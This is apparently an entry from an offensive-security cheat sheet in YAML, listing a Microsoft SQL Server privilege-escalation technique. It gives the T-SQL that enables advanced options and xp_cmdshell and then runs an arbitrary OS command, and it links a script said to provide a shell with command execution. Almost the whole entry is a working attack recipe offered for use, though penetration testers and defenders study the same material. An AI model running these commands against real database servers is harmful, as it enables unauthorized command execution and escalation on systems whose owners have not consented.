---
functions:
  privilege-escalation:
    - description: Enable command execution in Microsoft SQL Server
      code: |
        Enable command execution:
        EXEC sp_configure 'show advanced options',1;
        RECONFIGURE;
        exec SP_CONFIGURE 'xp_cmdshell',1;
        RECONFIGURE;
        EXEC xp_cmdshell [cmd]

resources : |
  https://gist.github.com/MidnightSeer/6bcfacc3699dbac67e2f080b00b7b77b   <-- this sript gives you a fake shell with command execution
---